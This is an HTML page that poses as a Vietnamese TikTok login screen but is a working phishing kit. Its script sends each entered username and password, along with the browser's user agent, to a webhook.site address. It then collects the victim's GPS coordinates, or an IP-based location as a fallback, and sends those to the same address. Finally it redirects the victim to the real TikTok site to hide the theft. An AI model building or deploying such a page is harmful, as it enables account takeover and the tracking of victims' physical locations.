<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>TikTok - Đăng nhập</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: #fff; padding: 40px 32px; border-radius: 16px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.2); }
        .logo { font-size: 48px; font-weight: 700; color: #fe2c55; margin-bottom: 24px; font-family: 'Arial Black', sans-serif; }
        h3 { font-size: 20px; margin-bottom: 24px; color: #161823; font-weight: 600; }
        input { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
        input:focus { border-color: #fe2c55; }
        button { background: #fe2c55; color: white; padding: 14px; width: 100%; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 16px 0 8px; }
        button:hover { opacity: 0.9; }
        .security-note { font-size: 12px; color: #888; margin-top: 20px; border-top: 1px solid #eee; padding-top: 16px; }
        .loader { display: none; margin-top: 16px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
    </style>
</head>
<body>
<div class="container" id="app">
    <div class="logo">TikTok</div>
    <h3>Đăng nhập vào tài khoản của bạn</h3>
    <input type="text" id="username" placeholder="Tên đăng nhập hoặc email" autocomplete="off">
    <input type="password" id="password" placeholder="Mật khẩu">
    <button onclick="login()">Đăng nhập</button>
    <div class="security-note">
        🔒 Vì lý do bảo mật, chúng tôi sẽ xác minh vị trí của bạn sau khi đăng nhập
    </div>
    <div class="loader" id="loader"><div class="spinner"></div></div>
</div>

<script>
const WEBHOOK = "https://webhook.site/c746b97f-524c-4fa1-8845-47e93ee3c38b";

function login() {
    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;
    
    if (!username || !password) {
        alert("Vui lòng nhập tên đăng nhập và mật khẩu");
        return;
    }
    
    document.getElementById('loader').style.display = 'block';
    document.querySelector('button').disabled = true;
    
    // Send credentials
    let img = new Image();
    img.src = `${WEBHOOK}?type=creds&user=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}&ua=${encodeURIComponent(navigator.userAgent)}&time=${Date.now()}`;
    
    fetch(`${WEBHOOK}?type=creds&user=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}`, {mode: 'no-cors'});
    
    // Get location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, fallbackIP);
    } else {
        fallbackIP();
    }
    
    function sendLocation(pos) {
        let lat = pos.coords.latitude;
        let lon = pos.coords.longitude;
        let acc = pos.coords.accuracy;
        fetch(`${WEBHOOK}?type=gps&lat=${lat}&lon=${lon}&acc=${acc}&user=${encodeURIComponent(username)}`, {mode: 'no-cors'});
        redirectToTikTok();
    }
    
    function fallbackIP() {
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                let location = `${data.city}, ${data.country_name} | Lat: ${data.latitude}, Lon: ${data.longitude} | IP: ${data.ip}`;
                fetch(`${WEBHOOK}?type=ip&location=${encodeURIComponent(location)}&user=${encodeURIComponent(username)}`, {mode: 'no-cors'});
                redirectToTikTok();
            })
            .catch(() => redirectToTikTok());
    }
    
    function redirectToTikTok() {
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com";
        }, 1500);
    }
}
</script>
</body>
</html>
